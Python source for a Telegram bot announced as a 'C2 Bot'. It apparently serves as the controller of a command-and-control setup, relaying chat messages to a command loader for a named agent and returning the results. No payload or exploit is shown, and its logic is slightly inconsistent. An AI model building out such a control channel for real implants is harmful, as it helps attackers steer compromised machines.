from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
from .config import Config
from ..data.database import create_schema
from ..commands.command_loader import load_and_execute_command  # Adjust the import path as necessary
import logging

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await context.bot.send_message(chat_id=update.effective_chat.id, text="C2 Bot started!")

async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command_name = update.message.text.strip("/")
    try:
        # Example usage, adjust parameters as necessary for your command functions
        result = load_and_execute_command(command_name, agent_id="example_agent_id", additional_data="data")
        await context.bot.send_message(chat_id=update.effective_chat.id, text=str(result))
    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))

def main():
    import datetime

    # Enable logging
    logging.basicConfig(
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
    )
    logging.getLogger("httpx").setLevel(logging.INFO)  # Set higher logging level for httpx
    logger = logging.getLogger(__name__)

    # Initialize Telegram Bot application
    application = Application.builder().token(Config.TELEGRAM_TOKEN).build()
    
    # Create database schema
    create_schema()

    # Register handlers
    application.add_handler(CommandHandler("start", start))
    # Register a message handler for text messages to handle commands dynamically
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_command))
    
    # Start the bot
    application.run_polling()
